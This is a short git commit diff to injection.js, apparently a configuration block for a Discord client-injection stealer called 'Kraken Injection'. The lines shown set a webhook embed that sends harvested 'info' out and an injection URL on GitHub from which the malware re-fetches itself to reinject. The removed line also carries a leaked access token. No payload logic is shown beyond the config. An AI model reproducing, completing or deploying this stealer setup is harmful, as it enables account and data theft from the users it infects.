f4ad817a06cb89177f2af8458ec51b42599a3f3e
krakenbeams <112346760+krakenbeams@users.noreply.github.com>
2022-08-28 20:28:42 +0100

    Update injection.js

--- injection.js
+++ injection.js
@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Kraken Injection', //name of the webhook thats gonna send the info
   embed_icon: 'https://media.discordapp.net/attachments/996863879768440933/1000386886830919720/131231.png?width=985&height=657'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 6684927, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/krakenbeams/injections/main/injection.js?token=GHSAT0AAAAAABYEFMJQLNUSJV22D5YYYLXQYYLYFPQ', //injection url for when it reinjects
+  injection_url: 'https://raw.githubusercontent.com/krakenbeams/injections/main/injection.js', //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
